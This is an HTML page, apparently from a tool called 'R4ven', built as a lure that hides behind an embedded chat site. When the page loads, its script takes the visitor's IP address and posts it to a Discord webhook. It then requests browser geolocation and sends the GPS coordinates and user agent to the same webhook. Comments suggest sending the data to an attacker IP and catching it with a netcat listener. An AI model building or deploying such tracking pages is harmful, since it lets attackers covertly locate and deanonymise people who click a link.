<!DOCTYPE html>
<html>

<head>
    <script type="text/javascript" 
        src="dwebhook.js">
    </script>
</head>

<body onload="getLocation()">

<iframe src="https://www.tohla.com/chat/" width="100%" height="900" loading="lazy ass" style="border:none;">
</iframe>

<p id="demo"></p>
<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>
<script>
var x = document.getElementById("demo");

$.getJSON("https://api.ipify.org?format=json", function(data) {
  $("#gfg").html(data.ip);

  const request = new XMLHttpRequest();
      request.open("POST", discord.webhook); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "Someone clicked the link !!"
        },
        title: "Target IP address",
        description: data.ip
      }

      var params = {
        username: "R4ven",
        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
        embeds: [ myEmbed ]
      }

      request.send(JSON.stringify(params));
})

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  var latlong = (" GET " , "__**Gps Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n\n__**Uagent:**__ " + navigator.userAgent);
  
  const request = new XMLHttpRequest();
      request.open("POST", discord.webhook); //change webhook

      request.setRequestHeader('Content-type', 'application/json');

      var myEmbed = {
        author: {
          name: "Allowed location PERMISSION !!"
        },
        title: "Fetched information...",
        description: latlong
      }

      var params = {
        username: "R4ven",
        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
        embeds: [ myEmbed ]
      }

      request.send(JSON.stringify(params));

//document.location='http://192.168.13.175:4321/'+latlong;
// use netcat to listen (nc -nlvp portnumber) (don‚Äôt forget to chnage ip and portnumber)
// and yeah that's random ip üòè
}

function showError(error) {
  switch(error.code) {
    case error.PERMISSION_DENIED:
      x.innerHTML = "User denied the request for Geolocation."
      break;
    case error.POSITION_UNAVAILABLE:
      x.innerHTML = "Location information is unavailable."
      break;
    case error.TIMEOUT:
      x.innerHTML = "The request to get user location timed out."
      break;
    case error.UNKNOWN_ERROR:
      x.innerHTML = "An unknown error occurred."
      break;
  }
}
</script>
</body>
</html>